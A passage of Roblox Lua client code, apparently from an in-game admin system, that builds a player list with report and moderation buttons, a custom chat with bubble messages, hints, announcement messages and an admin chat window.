				rd.Font=set.Font
				rd.BackgroundTransparency=0.8
				rd.Text='Please enter your reason for reporting '..p.Name..' here.'
				local rb=Instance.new('TextButton',rmain)
				rb.BackgroundColor3=set.PrimaryColor
				rb.BackgroundTransparency=0.8
				rb.BorderSizePixel=0
				rb.TextColor3=set.TextColor
				rb.TextStrokeTransparency=set.TextStrokeTransparency
				rb.TextStrokeColor3=set.TextStrokeColor
				rb.Font=set.Font
				rb.Text='Submit'
				rb.TextScaled=true
				rb.Size=UDim2.new(1,-10,0,44)
				rb.Position=UDim2.new(0,5,1,-47)
				rb.MouseButton1Click:connect(function()
					rmain:Destroy()
					if rd.Text~='' and rd.Text~='Please enter your reason for reporting '..p.Name..' here.' then
						Remote('SubmitReport',p,rd.Text)
					end
				end)
			end)
			if set.IsAdmin then
			local ban=report:clone()
			ban.Parent=menu
			ban.Text='Ban'
			ban.Position=UDim2.new(0,0,0,10*(#menu:children()-1))
			ban.MouseButton1Click:connect(function()
				menu.Visible=false
				Remote('Chat',set.Prefix..'ban'..set.SplitKey..p.Name,set.CustomChatMode)
			end)
			local kick=report:clone()
			kick.Parent=menu
			kick.Text='Kick'
			kick.Position=UDim2.new(0,0,0,10*(#menu:children()-1))
			kick.MouseButton1Click:connect(function()
				menu.Visible=false
				Remote('Chat',set.Prefix..'kick'..set.SplitKey..p.Name,set.CustomChatMode)
			end)
			local mute=report:clone()
			mute.Parent=menu
			mute.Text='Mute'
			mute.Position=UDim2.new(0,0,0,10*(#menu:children()-1))
			mute.MouseButton1Click:connect(function()
				menu.Visible=false
				if mute.Text=='Mute' then
					Remote('AdminCommand',set.Prefix..'mute'..set.SplitKey..p.Name,false,true)
					mute.Text='UnMute'
				else
					Remote('AdminCommand',set.Prefix..'unmute'..set.SplitKey..p.Name,false,true)
					mute.Text='Mute'
				end
			end)
			end
			if playergui:FindFirstChild(set.GuiName..'CUSTOMCHAT') then
			local ignore=report:clone()
			ignore.Parent=menu
			ignore.Text='Ignore'
			ignore.Position=UDim2.new(0,0,0,10*(#menu:children()-1))
			ignore.MouseButton1Click:connect(function()
				menu.Visible=false
				if ignore.Text=='Ignore' then 
					table.insert(set.IgnoreList,p.Name)
					ignore.Text='UnIgnore'
				else
					for i,v in pairs(set.IgnoreList) do
						if v==p.Name then
							table.remove(set.IgnoreList,i)
						end
					end
					ignore.Text='Ignore'
				end
			end)
			end
			menu.Size=UDim2.new(0,50,0,10*(#menu:children()))
		elseif menu then
			if menu.Visible then
				menu.Visible=false
			else
				menu.Visible=true
			end
		end
	end)
	if #main:children()<=10 then
		main.Size=UDim2.new(0,200,0,20*(#main:children()))
	end--else
		main.CanvasSize=UDim2.new(0,0,#main:children()/20,0)
	--end
end

set.RemovePlayerFromList=function(p)
	if not p:IsA('Player') then return end
	local scr=playergui:FindFirstChild(set.GuiName..'CUSTOMLEADERBOARD')
	if not scr then return end
	local main=scr.ListDrag.ScrollingFrame
	if main:FindFirstChild(p.Name) then
		main[p.Name]:Destroy()
		for i,v in pairs(main:children()) do
			v.Position=UDim2.new(0,0,0,20*(i-1))
		end
		main.CanvasSize=UDim2.new(0,0,#main:children()/20,0)
		main.Size=UDim2.new(0,200,0,20*(#main:children()))
	end
end

set.CustomLeaderboard=function()
	if playergui:FindFirstChild(set.GuiName..'CUSTOMLEADERBOARD') then return end
	game:service('StarterGui'):SetCoreGuiEnabled('PlayerList',false)
	playerlistenabled=false
	local scr=Instance.new('ScreenGui',playergui) scr.Name=set.GuiName..'CUSTOMLEADERBOARD'
	local listdrag=Instance.new('TextLabel',scr)
	local toggle=Instance.new('TextButton',listdrag)
	local main=Instance.new('ScrollingFrame',listdrag)
	main.BackgroundColor3=set.PrimaryColor
	main.BackgroundTransparency=set.Transparency
	--main.BorderSizePixel=0
	main.BorderSizePixel=0
	main.Size=UDim2.new(0,200,0,20)
	main.Position=UDim2.new(0,0,0,15)
	main.ClipsDescendants=false
	listdrag.BackgroundColor3=set['PrimaryColor']
	listdrag.BorderSizePixel=0
	listdrag.BackgroundTransparency=set['Transparency']
	listdrag.Position=UDim2.new(1,-210,0,10)
	listdrag.Size=UDim2.new(0,80,0,15)
	listdrag.Draggable=true
	listdrag.Active=true
	listdrag.Text='Player List'
	listdrag.Font=set.Font
	listdrag.TextColor3=set['TextColor']
	listdrag.TextStrokeColor3=set['TextStrokeColor']
	listdrag.TextStrokeTransparency=set.TextStrokeTransparency
	listdrag.TextScaled=true
	listdrag.TextWrapped=true
	listdrag.Name='ListDrag'
	listdrag.ZIndex=10
	toggle.BackgroundColor3=set['PrimaryColor']
	toggle.BorderSizePixel=0
	toggle.BackgroundTransparency=set['Transparency']
	toggle.Position=UDim2.new(0,80,0,0)
	toggle.Size=UDim2.new(0,15,0,15)
	toggle.Active=true
	toggle.Text='-'
	toggle.Font=set.Font
	toggle.TextColor3=set['TextColor']
	toggle.TextStrokeColor3=set['TextStrokeColor']
	toggle.TextStrokeTransparency=set.TextStrokeTransparency
	toggle.TextScaled=true
	toggle.TextWrapped=true
	toggle.Name='Toggle'
	toggle.MouseButton1Click:connect(function()
		if main.Visible==true then
			main.Visible=false
			toggle.Text='+'
		else
			main.Visible=true
			toggle.Text='-'
		end
	end)
	Remote('GetCurrentPlayerList')
end

set.CustomChatGui=function()
	if set.CustomChatType~='Both' and set.CustomChatType~='Classic' and set.CustomChatType~='Bubbles' then set.CustomChatType='Both' end
	if playergui:FindFirstChild(set.GuiName..'CUSTOMCHAT') then return end
	game:service('StarterGui'):SetCoreGuiEnabled('Chat',false)
	local gui=Instance.new('ScreenGui',playergui) gui.Name=set.GuiName..'CUSTOMCHAT'
	local chatbar=Instance.new('TextBox',gui)
	local chatdrag=Instance.new('TextLabel',gui)
	local toggle=Instance.new('TextButton',chatdrag)
	local chatwindow=Instance.new('Frame',chatdrag)
	local cbut=Instance.new('TextButton',chatdrag)
	cbut.Name='Mode'
	cbut.Size=UDim2.new(0,15,0,15)
	cbut.Position=UDim2.new(0,40,0,0)
	cbut.BackgroundColor3=set['PrimaryColor']
	cbut.BackgroundTransparency=set['Transparency']
	cbut.BorderSizePixel=0
	cbut.Font=set.Font
	cbut.Text='G'
	cbut.TextColor3=set['TextColor']
	cbut.TextStrokeTransparency=set.TextStrokeTransparency
	cbut.TextStrokeColor3=set['TextStrokeColor']
	cbut.TextScaled=true
	cbut.TextWrapped=true
	if set.CustomChatMode=='Global' then
		cbut.Text='G'
	elseif set.CustomChatMode=='Team' then
		cbut.Text='T'
	elseif set.CustomChatMode=='Local' then
		cbut.Text='L'
	elseif set.CustomChatMOde=='Admin' then
		cbut.Text='A'
	end
	cbut.MouseButton1Click:connect(function()
		Remote('CheckAdmin')
		if set.CustomChatMode=='Global' then
			set.CustomChatMode='Team'
			chatdrag.Text=set.CustomChatMode
			cbut.Text='T'
		elseif set.CustomChatMode=='Team' then
			set.CustomChatMode='Local'
			chatdrag.Text=set.CustomChatMode
			cbut.Text='L'
		elseif set.CustomChatMode=='Local' then
			if set.IsAdmin then
				set.CustomChatMode='Admin'
				cbut.Text='A'
			else
				set.CustomChatMode='Global'
				cbut.Text='G'
			end
			chatdrag.Text=set.CustomChatMode
		elseif set.CustomChatMode=='Admin' then
			set.CustomChatMode='Global'
			cbut.Text='G'
			chatdrag.Text=set.CustomChatMode
		end
	end)
	chatbar.BackgroundColor3=set['PrimaryColor']
	chatbar.BorderSizePixel=0
	chatbar.TextColor3=set['TextColor']
	chatbar.BackgroundTransparency=set['Transparency']
	chatbar.Position=UDim2.new(0,0,1,-20)
	chatbar.Size=UDim2.new(1,0,0,20)
	chatbar.Font=set.Font
	chatbar.Text='Click here or press the \'/\' key to chat'
	chatbar.TextColor3=set['TextColor']
	chatbar.TextScaled=true
	chatbar.TextWrapped=true
	chatbar.TextStrokeColor3=set['TextStrokeColor']
	chatbar.TextStrokeTransparency=set.TextStrokeTransparency
	chatbar.TextXAlignment='Left'
	chatbar.ClearTextOnFocus=false
	chatbar.ZIndex=10
	chatbar.FocusLost:connect(function(enterPressed)
		if enterPressed then
			if chatbar.Text~='' and set.ChatTimer>=0.5 then
			if not set.Muted then
				Remote('Chat',chatbar.Text,set.CustomChatMode)
			end
			chatbar.Text='Click here or press the \'/\' key to chat'
			end
			ResetChatTimer()
		end
	end)
	chatbar.InputBegan:connect(function(itype) 
		if itype.UserInputType==Enum.UserInputType.MouseButton1 and chatbar.Text=='Click here or press the \'/\' key to chat' then 
			chatbar.Text='' 
		end 
	end)
	game:service('UserInputService').InputBegan:connect(function(InputObject)
		if InputObject.UserInputType==Enum.UserInputType.Keyboard and InputObject.KeyCode == Enum.KeyCode.Slash then
			if chatbar.Text=='Click here or press the \'/\' key to chat' then chatbar.Text='' end
			wait()
			chatbar:CaptureFocus()
		end
	end)
	chatdrag.BackgroundColor3=set['PrimaryColor']
	chatdrag.BorderSizePixel=0
	chatdrag.BackgroundTransparency=set['Transparency']
	chatdrag.Position=UDim2.new(0,10,0,10)
	chatdrag.Size=UDim2.new(0,40,0,15)
	chatdrag.Draggable=true
	chatdrag.Active=true
	chatdrag.Text=set.CustomChatMode
	chatdrag.Font=set.Font
	chatdrag.TextColor3=set['TextColor']
	chatdrag.TextStrokeColor3=set['TextStrokeColor']
	chatdrag.TextStrokeTransparency=set.TextStrokeTransparency
	chatdrag.TextScaled=true
	chatdrag.TextWrapped=true
	chatdrag.Name='ChatDrag'
	chatdrag.ZIndex=10
	toggle.BackgroundColor3=set['PrimaryColor']
	toggle.BorderSizePixel=0
	toggle.BackgroundTransparency=set['Transparency']
	toggle.Position=UDim2.new(0,55,0,0)
	toggle.Size=UDim2.new(0,15,0,15)
	toggle.Active=true
	toggle.Text='-'
	toggle.Font=set.Font
	toggle.TextColor3=set['TextColor']
	toggle.TextStrokeColor3=set['TextStrokeColor']
	toggle.TextStrokeTransparency=set.TextStrokeTransparency
	toggle.TextScaled=true
	toggle.TextWrapped=true
	toggle.Name='Toggle'
	toggle.MouseButton1Click:connect(function()
		if chatwindow.Visible==true then
			chatwindow.Visible=false
			toggle.Text='+'
		else
			chatwindow.Visible=true
			toggle.Text='-'
		end
	end)
	chatwindow.Position=UDim2.new(0,0,0,15)
	chatwindow.Size=UDim2.new(0,700,0,200)
	chatwindow.BorderSizePixel=0
	chatwindow.Name='ChatWindow'
	chatwindow.BackgroundTransparency=1
	if set.CustomChatType=='Bubbles' then
		chatwindow.Visible=false
		toggle.Visible=false
		chatwindow.Visible=false
		chatdrag.Visible=false
	end
	for i,v in pairs(set.LocalChatCache) do
		local frame=Instance.new('Frame',chatwindow)
		local player,message,type,mode=v.player,v.message,v.type,v.mode
		local label=Instance.new('TextLabel',frame)
		frame.BackgroundTransparency=1
		frame.Size=UDim2.new(1,0,0,15)
		frame.Position=UDim2.new(0,0,0,15*(#chatwindow:children()-1))
		frame.ZIndex=10
		label.BackgroundTransparency=1
		label.Text=message
		label.Font=set.Font
		label.TextColor3=set['TextColor']
		label.TextStrokeColor3=set['TextStrokeColor']
		label.TextStrokeTransparency=set.TextStrokeTransparency
		--label.TextScaled=true
		label.TextWrapped=true
		label.FontSize='Size14'
		label.TextXAlignment='Left'
		local name=label:clone()
		name.Parent=frame
		name.Position=UDim2.new(0,0,0,0)
		name.Text=player..':'
		if mode=='Local' then
			name.TextColor3=Color3.new(154/255,154/255,154/255)
		elseif mode=='Global' then
			name.TextColor3=Color3.new(0,1,1)
		elseif mode=='Team' then
			name.TextColor3=Color3.new(0,1,0)
		elseif mode=='Admin' then
			name.TextColor3=Color3.new(1,1,0)
		elseif mode=='Private' then
			name.TextColor3=Color3.new(170/255,0,1)
		elseif mode=='Nil' then
			name.TextColor3=Color3.new(1,1,1)
			name.Text='[NIL]'..name.Text
		end
		label.Size=UDim2.new(1,-(name.TextBounds.X+2),1,0)
		label.Position=UDim2.new(0,(name.TextBounds.X+2),0,0)
		name.Size=UDim2.new(0,(name.TextBounds.X+2),1,0)
	end
end
set.RemoveCustomChat=function()
	local chat=playergui:FindFirstChild(set.GuiName..'CUSTOMCHAT')
	if chat then chat:Destroy() game:service('StarterGui'):SetCoreGuiEnabled('Chat',true) end
end
set.SendToChat=function(player,message,mode)
	if set.SeparatedChannels and mode~=set.CustomChatMode then return end
	for i,v in pairs(set.IgnoreList) do if player.Name==v then return end end
	if message:sub(1,2)=='/e' then return end
	local chat=playergui:FindFirstChild(set.GuiName..'CUSTOMCHAT')
	if not chat then return end
	local chatwindow=chat.ChatDrag.ChatWindow
	Pcall(function() if #set.LocalChatCache==10 then table.remove(set.LocalChatCache,1)  end end)
	set.LocalChatCache[#set.LocalChatCache+1]={player=player.Name,message=message,mode=mode}
	if #chatwindow:children()==10 then chatwindow:children()[1]:Destroy() for h,l in pairs(chatwindow:children()) do l.Position=UDim2.new(0,0,0,15*(h-1)) end end
	local frame=Instance.new('Frame',chatwindow)
	local label=Instance.new('TextLabel',frame)
	frame.BackgroundTransparency=1
	frame.Size=UDim2.new(1,0,0,15)
	frame.Position=UDim2.new(0,0,0,15*(#chatwindow:children()-1))
	frame.ZIndex=10
	label.BackgroundTransparency=1
	label.Text=message
	label.Font=set.Font
	label.TextColor3=set['TextColor']
	label.TextStrokeColor3=set['TextStrokeColor']
	label.TextStrokeTransparency=set.TextStrokeTransparency
	--label.TextScaled=true
	label.FontSize='Size14'
	label.TextWrapped=true
	label.TextXAlignment='Left'
	local name=label:clone()
	name.Parent=frame
	name.Position=UDim2.new(0,0,0,0)
	name.Text=player.Name..':'
	if mode=='Local' then
		name.TextColor3=Color3.new(154/255,154/255,154/255)
	elseif mode=='Global' then
		name.TextColor3=Color3.new(0,1,1)
	elseif mode=='Team' then
		name.TextColor3=Color3.new(0,1,0)
	elseif mode=='Admin' then
		name.TextColor3=Color3.new(1,1,0)
	elseif mode=='Private' then
		name.TextColor3=Color3.new(170/255,0,1)
	elseif mode=='Nil' then
		name.TextColor3=Color3.new(1,1,1)
		name.Text='[NIL]'..name.Text
	end
	label.Size=UDim2.new(1,-(name.TextBounds.X+2),1,0)
	label.Position=UDim2.new(0,(name.TextBounds.X+2),0,0)
	name.Size=UDim2.new(0,(name.TextBounds.X+2),1,0)
	if set.CustomChatType=='Both' or set.CustomChatType=='Bubbles' then
		for i,v in pairs(playergui:children()) do
			if v.Name==player.Name..'BubbleChatFrame' then
				v.StudsOffset=Vector3.new(0,v.StudsOffset.Y+1,0)
			end
		end
	local bbg=Instance.new('BillboardGui',playergui)
	bbg.Name=player.Name..'BubbleChatFrame'
	bbg.Adornee=player.Character.Head
	bbg.StudsOffset=Vector3.new(0,3,0)
	bbg.Size=UDim2.new(0,10*#label.Text,0,20)
	local cam=workspace.CurrentCamera
	local char=player.Character
	local label=Instance.new('TextLabel',bbg)
	label.BackgroundColor3=set['PrimaryColor']
	label.BackgroundTransparency=set['Transparency']
	label.BorderSizePixel=0
	label.Text=message
	label.FontSize = "Size18"
	bbg.Size=UDim2.new(0,label.TextBounds.X+5,0,label.TextBounds.Y)
	label.Size=UDim2.new(1,0,1,0)
	--label.Text=''
	label.TextColor3=set['TextColor']
	label.TextStrokeColor3=set['TextStrokeColor']
	label.TextStrokeTransparency=set.TextStrokeTransparency
	--label.TextScaled=true
	label.Font=set.Font
	message=message:sub(1,100)
	coroutine.wrap(function() 
		--wait((#message/5)+5)
		wait(5)
		if bbg and bbg.Name~='RemovingBillboardGui' then
		bbg.Name='RemovingBillboardGui'
		local run=true
		coroutine.wrap(function() wait(1) run=false end)()
		repeat
			bbg.StudsOffset=Vector3.new(0,bbg.StudsOffset.Y+0.1,0)
			bbg.TextLabel.BackgroundTransparency=bbg.TextLabel.BackgroundTransparency+0.1
			bbg.TextLabel.TextTransparency=bbg.TextLabel.TextTransparency+0.1
			bbg.TextLabel.TextStrokeTransparency=bbg.TextLabel.TextStrokeTransparency+0.1
			wait()
		until (not bbg) or run==false
		bbg:Destroy()
		end
	end)()
--	coroutine.wrap(function()
--		for i = 1, #message do 
--			label.Text = label.Text .. message:sub(i,i)
--			wait() 
--		end 
--	end)()
	coroutine.wrap(function() 
		repeat 
			if (char.Head.Position - cam.CoordinateFrame.p).magnitude <= 100 then 
				label.Visible = true
				--bbg.Enabled=true 
			else 
				label.Visible = false
				--bbg.Enabled=false 
			end
			if (char.Head.Position - cam.CoordinateFrame.p).magnitude <= (100/7) then 
				label.FontSize = "Size24"
				bbg.Size=UDim2.new(0,(label.TextBounds.X+5),0,label.TextBounds.Y)
			elseif (char.Head.Position - cam.CoordinateFrame.p).magnitude <= (100/7)*2 then 
				label.FontSize = "Size18"
				bbg.Size=UDim2.new(0,(label.TextBounds.X+5),0,label.TextBounds.Y)
			elseif (char.Head.Position - cam.CoordinateFrame.p).magnitude <= (100/7)*3 then 
				label.FontSize = "Size14"
				bbg.Size=UDim2.new(0,(label.TextBounds.X+5),0,label.TextBounds.Y)
			elseif (char.Head.Position - cam.CoordinateFrame.p).magnitude <= (100/7)*4 then 
				label.FontSize = "Size12"
				bbg.Size=UDim2.new(0,(label.TextBounds.X+5)/2,0,label.TextBounds.Y/2)
			elseif (char.Head.Position - cam.CoordinateFrame.p).magnitude <= (100/7)*5 then 
				label.FontSize = "Size10"
				bbg.Size=UDim2.new(0,(label.TextBounds.X+5)/3,0,label.TextBounds.Y/3)
			elseif (char.Head.Position - cam.CoordinateFrame.p).magnitude <= (100/7)*6 then 
				label.FontSize = "Size9"
				bbg.Size=UDim2.new(0,(label.TextBounds.X+5)/4,0,label.TextBounds.Y/4)
			elseif (char.Head.Position - cam.CoordinateFrame.p).magnitude <= 100 then 
				label.FontSize = "Size8"
				bbg.Size=UDim2.new(0,(label.TextBounds.X+5)/5,0,label.TextBounds.Y/5)
			end 
			wait() 
		until bbg.Parent==nil or not bbg or not label
	end)()
	end
end

set.ListGui=function(name,tab,update,width)
local plr=localplayer
if plr.PlayerGui:findFirstChild(set.GuiName..name.."GUI") then return end
local scr, cmf, ent, num, top, main, point = set.MainScrollGui() 
scr.Name = set.GuiName..name.."GUI" scr.Parent = plr.PlayerGui
top.Text=name
if width then
	scr.Drag.Size=UDim2.new(0,width,0,30)
end
local function logdisplay(p)
num=0
for i,v in pairs(tab) do
if num<=set['MaxNumberOfLogs'] and (v.Filter and v.Filter:lower():find(p:lower())) or (((type(v)=='table' and v.Object:lower():find(p:lower()) or (type(v)=='string' and v:lower():find(p:lower())))) or p:lower()=='all') then
local cl = ent:Clone()
Expand(cl,point,cmf,main) 
cl.Parent = cmf 
if type(v)=='table' then 
	if v.Desc and v.Object then
		cl.Text = v.Object
		cl.Desc.Value = v.Desc
		if v.Color then
			cl.TextColor3=v.Color
		end
	end
elseif type(v)=='string' then
	cl.Text = v
	cl.Desc.Value = cl.Text
end
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1
--wait()
end 
end
if cmf:FindFirstChild('Counter') then cmf.Counter:Destroy() end
local cl = ent:Clone()
Expand(cl,point,cmf,main) 
cl.Parent = cmf 
cl.Name='Counter'
cl.Text=(num)..' Item(s)'
cl.Position = UDim2.new(0,0,0,num*20)
cl.Desc.Value='There are '..(num)..' items currently being displayed.'
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
end
local b=Instance.new('TextBox',main.Parent)
b.Size=UDim2.new(0,130,0,20)
b.Position=UDim2.new(0,5,0,5) 
b.BackgroundColor3=set.SecondaryColor--PrimaryColor
b.BackgroundTransparency=set['Transparency']
b.TextColor3=set['TextColor']
b.BorderSizePixel=0
b.TextStrokeTransparency=set.TextStrokeTransparency
b.TextStrokeColor3=set.TextStrokeColor
b.Text=''
b.ZIndex=9
b.Font=set.Font
b.TextScaled=true
b.TextWrapped=true
b.FocusLost:connect(function(enterPressed)
	if enterPressed and (b.Text~='' or string.len(b.Text)>0) then
		cmf:ClearAllChildren()
		logdisplay(b.Text)
	elseif enterPressed and (b.Text=='' or string.len(b.Text)==0 or b.Text:lower()=='all') then
		cmf:ClearAllChildren()
		logdisplay('all')
	end
end)
local refresh = Instance.new("TextButton", main.Parent) 
refresh.Style = "Custom" 
refresh.Size = UDim2.new(0,20,0,20) 
refresh.Position = UDim2.new(1,-75,0,5) 
refresh.ZIndex = 10 
refresh.Font = set.Font 
refresh.FontSize = "Size18" 
refresh.Text = "R" 
refresh.BackgroundColor3=set['PrimaryColor']
refresh.BorderSizePixel=0
refresh.TextColor3 = set.TextColor--set['SecondaryColor']
refresh.BackgroundTransparency=set['Transparency'] 
refresh.MouseButton1Click:connect(function() 
	cmf:ClearAllChildren() 
	if (b.Text~='' or string.len(b.Text)>0) then
		if update then
			Remote('UpdateList',update)
			wait(0.5)
			tab=set[update]
		end
		cmf:ClearAllChildren()
		logdisplay(b.Text)
	elseif (b.Text=='' or string.len(b.Text)==0 or b.Text:lower()=='all') then
		if update then
			Remote('UpdateList',update)
			wait(0.5)
			tab=set[update]
		end
		cmf:ClearAllChildren()
		logdisplay('all')
	end
end)
logdisplay('all')
end

set.Hint=function(str, time)
if not playergui:FindFirstChild(set.GuiName..'HINTS') then
	local g=Instance.new('ScreenGui',playergui)
	local f=Instance.new('Frame',g)
	g.Name=set.GuiName..'HINTS'
	f.Size=UDim2.new(1,0,0,100)
	f.BackgroundTransparency=1
end
local frame=playergui[set.GuiName..'HINTS'].Frame
if #frame:children()==6 then 
	frame:children()[1]:Destroy() 
	for h,l in pairs(frame:children()) do
		l.Position=UDim2.new(0,0,0,23*(h-1))
	end
end
--local scr = Instance.new("ScreenGui") scr.Name = set.GuiName.."HintGUI"
local bg = Instance.new("Frame") 
bg.Name = "bg" 
bg.BackgroundColor3 = set['PrimaryColor'] 
bg.BorderSizePixel=0
bg.BorderColor3 = set['SecondaryColor']
bg.BackgroundTransparency = set['Transparency']
bg.Size = UDim2.new(1,0,0,23)
bg.ClipsDescendants=true
bg.ZIndex = 8
local msg = Instance.new("TextLabel", bg) 
msg.BackgroundTransparency = 1 
msg.ZIndex = 9 
msg.Name = "msg" 
msg.Position = UDim2.new(0,0,0) 
msg.Size = UDim2.new(1,0,1,0)
msg.TextWrapped=true
msg.TextScaled=true 
msg.Font = set.Font 
msg.TextStrokeTransparency=set.TextStrokeTransparency
msg.TextStrokeColor3=set['TextStrokeColor']
msg.Text = str 
msg.FontSize = "Size14" 
msg.TextColor3 = set['TextColor'] 
bg.Position = UDim2.new(0,0,0,23*(#frame:children()))
bg.Parent=frame
--bg:TweenPosition(UDim2.new(0,0,0,bg.Position.Y.Offset),'Out','Linear',0.1)
if not time then wait((#str/19)+2.5) else wait(time) end
bg:Destroy() 
for h,l in pairs(frame:children()) do
	if set.Animations then
		l:TweenPosition(UDim2.new(0,0,0,23*(h-1)),'Out','Bounce',0.2)
	else
		l.Position=UDim2.new(0,0,0,23*(h-1))
	end
end
end

set.Message=function(ttl, str, scroll, time)
local scr = Instance.new("ScreenGui") scr.Name = set.GuiName.."MessageGUI"
local bg = Instance.new("Frame", scr) 
bg.Name = "bg" 
bg.BackgroundColor3 = set['PrimaryColor'] 
bg.BorderSizePixel = 0 
bg.BackgroundTransparency = 0
bg.Size = UDim2.new(1,0,1,0) 
bg.Position = UDim2.new(0,0,-1,0)--UDim2.new(-1,0,1,0)
bg.ZIndex = 8
local title = Instance.new("TextLabel", bg) 
title.Name = "title" 
title.BackgroundTransparency = 1 
title.BorderSizePixel = 0 
title.Size = UDim2.new(1,0,0,10) 
title.Position = UDim2.new(0,0,0,20)
title.ZIndex = 9 
title.Font = set.Font 
title.FontSize = "Size36" 
title.Text = ttl 
title.TextYAlignment = "Top" 
title.TextColor3 = set['TextColor']
title.TextStrokeColor3 = set['TextStrokeColor'] 
title.TextStrokeTransparency=set.TextStrokeTransparency
local msg = title:clone() 
msg.Parent = bg
msg.Name = "msg" 
msg.Position = UDim2.new(.0625,0,0) 
msg.Size = UDim2.new(.875,0,1,0) 
msg.Font = set.Font 
msg.Text = "" 
msg.FontSize = "Size24" 
msg.TextYAlignment = "Center" 
msg.TextColor3=set['TextColor']
msg.TextStrokeColor3=set['TextStrokeColor']
msg.TextWrapped = true
bg.ClipsDescendants=true
bg.BackgroundTransparency=set.Transparency
scr.Parent = playergui
if set.Animations and set.MessageAnimations then
	bg:TweenPosition(UDim2.new(0,0,0,0),'Out','Quad',1,false)
else
	bg.Position=UDim2.new(0,0,0,0)
end
if scroll then 
	if not time then 
		for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) 
			wait(1/19) 
		end 
		wait(2.5) 
	else 
		for i = 1, #str do 
			msg.Text = msg.Text .. str:sub(i,i) 
			wait(1/19) 
		end 
		wait(time-(#str/19)) 
	end
elseif not time then 
	msg.Text = str 
	wait((#str/19)+2.5) 
else 
	msg.Text = str 
	wait(time) 
end
local moved=false
local function move()
if not scr then return end
if set.Animations and set.MessageAnimations then
	bg:TweenPosition(UDim2.new(0,0,1,0),'Out','Quad',1,true,function() moved=true scr:Destroy() end)
else
	bg.Position=UDim2.new(1,0,1,0)
end
wait(1.1)
if not moved then move() end
end
pcall(move)
wait(0.3)
pcall(move)
pcall(function() wait(1) scr:Destroy() end)
end

set.AdminChat=function()
	local plr=localplayer
	if plr.PlayerGui:FindFirstChild(set.GuiName..'adminchat') then return end
	local g=Instance.new('ScreenGui',plr.PlayerGui) g.Name=set.GuiName..'adminchat'
	local f=Instance.new('Frame',g)
	local cf=Instance.new('Frame',f)
	local bar=Instance.new('TextBox',f)
	local title=Instance.new('TextLabel',f)
	local cbut=Instance.new('TextButton',f)
	local close=Instance.new('TextButton',f)
	f.BackgroundColor3=set['PrimaryColor']
	f.BorderSizePixel=0
	f.BackgroundTransparency=set['Transparency']
	f.Position=UDim2.new(0,5,1,-250)
	f.Size=UDim2.new(0,300,0,150)
	f.ClipsDescendants=true
	f.Draggable=true
	f.Active=true
	cf.BackgroundColor3=set['PrimaryColor']
	cf.BorderSizePixel=0
	cf.BackgroundTransparency=set['Transparency']
	cf.Position=UDim2.new(0,0,0,20)
	cf.Size=UDim2.new(0,300,0,105)
	cf.ClipsDescendants=true
	bar.BackgroundColor3=set['PrimaryColor']
	bar.BorderSizePixel=0
	bar.BackgroundTransparency=set['Transparency']
	bar.Position=UDim2.new(0,2,0,130)
	bar.Size=UDim2.new(0,248,0,18)
	bar.Font=set.Font
	bar.Text='Type here then press "Chat" or Enter'
	bar.TextScaled=true
	bar.TextWrapped=true
	bar.TextStrokeTransparency=set.TextStrokeTransparency
	bar.TextStrokeColor3=set['TextStrokeColor']
	bar.TextColor3=set['TextColor']
	title.BackgroundTransparency=1
	title.Size=UDim2.new(0,300,0,15)
	title.Font=set.Font
	title.Text='Admin Chat'
	title.TextColor3=set['TextColor']
	title.TextStrokeTransparency=set.TextStrokeTransparency
	title.TextStrokeColor3=set['TextStrokeColor']
	title.TextScaled=true
	title.TextWrapped=true
	cbut.BackgroundColor3=set['PrimaryColor']
	cbut.BackgroundTransparency=set['Transparency']
	cbut.BorderSizePixel=0
	cbut.Position=UDim2.new(0,253,0,130)
	cbut.Size=UDim2.new(0,45,0,18)
	cbut.Font=set.Font
	cbut.Text='Chat'
	cbut.TextColor3=set['TextColor']
	cbut.TextScaled=true
	cbut.TextWrapped=true
	cbut.TextStrokeTransparency=set.TextStrokeTransparency
	cbut.TextStrokeColor3=set['TextStrokeColor']
	close.BackgroundColor3=set.PrimaryColor
	close.BorderColor3=set['PrimaryColor']
	close.BackgroundTransparency=0.5
	close.Position=UDim2.new(1,-20,0,2)
	close.Size=UDim2.new(0,15,0,15)
	close.Font=set.Font
	close.Text='X'
	close.TextColor3=set.TextColor
	close.TextScaled=true
	close.TextStrokeTransparency=set.TextStrokeTransparency
	close.TextStrokeColor3=set['TextStrokeColor']
	close.MouseButton1Click:connect(function() g:Destroy() end)
	cbut.MouseButton1Click:connect(function()
		if bar.Text~='' and bar.Text~='Type here then press "Chat" or Enter' then
			Remote('AdminChat',plr.Name..': '..bar.Text)
			bar.Text='Type here then press "Chat" or Enter'
		elseif bar.Text=='' then
			bar.Text='Type here then press "Chat" or Enter'
		end
	end)
	bar.FocusLost:connect(function(enterPressed)
		if enterPressed then
			if bar.Text~='' and bar.Text~='Type here then press "Chat" or Enter' then
				Remote('AdminChat',plr.Name..': '..bar.Text)
				bar.Text='Type here then press "Chat" or Enter'
			elseif bar.Text=='' then
				bar.Text='Type here then press "Chat" or Enter'
			end
		end
	end)
end

set.AlertGui=function(msg)
	if playergui:FindFirstChild(set.GuiName..'ALERT') then return end
	local scr=Instance.new('ScreenGui') scr.Name=set.GuiName..'ALERT'
	local main=Instance.new('Frame',scr)
	main.BackgroundTransparency=set.Transparency
	main.BackgroundColor3=set.PrimaryColor
	main.BorderSizePixel=0
	main.Size=UDim2.new(0.5,0,0.5,0)
	main.Position=UDim2.new(0.25,0,0.25,0)
	local label=Instance.new('TextLabel',main)
	label.Size=UDim2.new(1,0,1,-20)
	label.BackgroundTransparency=1
	label.TextScaled=true
	label.Font=set.Font
	label.Text=''--msg
	label.TextColor3=set.TextColor
	label.TextStrokeTransparency=set.TextStrokeTransparency
	label.TextStrokeColor3=set.TextStrokeColor
	local button=Instance.new('TextButton',main)
	button.BackgroundTransparency=set.Transparency
	button.BackgroundColor3=set.PrimaryColor--PrimaryColor
	--button.BorderSizePixel=0
	button.Font=set.Font
	button.BorderSizePixel=0
	button.TextColor3=set.TextColor
	button.TextScaled=true
	button.Position=UDim2.new(0,5,1,-25)
	button.Size=UDim2.new(1,-10,0,20)
	button.Text='Ok'
	button.TextStrokeTransparency=set.TextStrokeTransparency
	button.TextStrokeColor3=set.TextStrokeColor
	scr.Parent=playergui
	local alarm=Instance.new('Sound',main)
